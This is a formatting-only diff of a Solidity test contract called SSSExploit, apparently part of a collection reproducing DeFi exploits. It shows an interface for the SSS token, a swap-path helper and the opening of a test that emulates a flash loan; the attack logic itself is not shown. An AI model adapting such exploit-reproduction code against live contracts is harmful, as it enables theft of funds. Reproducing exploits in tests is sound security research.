@@ -15,7 +15,9 @@ import "./../interface.sol";
 
 interface ISSS is IERC20 {
     function maxAmountPerTx() external view returns (uint256);
-    function burn(uint256) external;
+    function burn(
+        uint256
+    ) external;
 }
 
 contract SSSExploit is BaseTestWithBalanceLog {
@@ -35,14 +37,15 @@ contract SSSExploit is BaseTestWithBalanceLog {
         fundingToken = address(WETH);
     }
 
-    function getPath(bool buy) internal view returns (address[] memory path) {
+    function getPath(
+        bool buy
+    ) internal view returns (address[] memory path) {
         path = new address[](2);
         path[0] = buy ? address(WETH) : address(SSS);
         path[1] = buy ? address(SSS) : address(WETH);
     }
 
     function testExploit() public balanceLog {
-
         //Emulate flashloan here with deal
         vm.deal(address(this), 0);
         vm.deal(address(this), ethFlashAmt);
